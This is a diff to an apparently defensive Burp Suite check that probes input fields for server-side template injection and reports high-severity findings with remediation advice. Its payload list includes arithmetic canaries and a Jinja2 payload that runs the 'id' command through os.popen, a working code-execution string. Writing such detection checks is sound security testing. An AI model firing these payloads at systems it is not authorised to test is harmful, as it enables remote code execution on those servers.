@@ -5,18 +5,21 @@ metadata:
     author: "BCheck Arsenal"
     tags: "ssti", "rce", "waf-bypass"
 
+run for each:
+    payload = "{{7*7}}",
+        "${7*7}",
+        "#{7*7}",
+        "<%= 7*7 %>",
+        "{{7*'7'}}",
+        "${{7*7}}",
+        "{{request.__class__.__mro__[2].__subclasses__()}}",
+        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+
 given insertion point then
     send payload:
-        replacing: "{insertion_point}"
-        following replacements:
-            - "{{7*7}}"
-            - "${7*7}"
-            - "#{7*7}"
-            - "<%= 7*7 %>"
-            - "{{7*'7'}}"
-            - "${{7*7}}"
+        replacing: {payload}
 
-    if {mathCheck.response} matches "49" then
+    if {latest.response} matches "49" then
         report issue:
             severity: high
             confidence: firm
@@ -24,13 +27,7 @@ given insertion point then
             remediation: "Never pass user input into template strings. Use sandboxed template engines."
     end if
 
-    send payload:
-        replacing: "{insertion_point}"
-        following replacements:
-            - "{{request.__class__.__mro__[2].__subclasses__()}}"
-            - "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
-
-    if {jinja2.response} matches "(uid=|subprocess|catch_warnings|Popen)" then
+    if {latest.response} matches "(uid=|subprocess|catch_warnings|Popen)" then
         report issue:
             severity: high
             confidence: certain
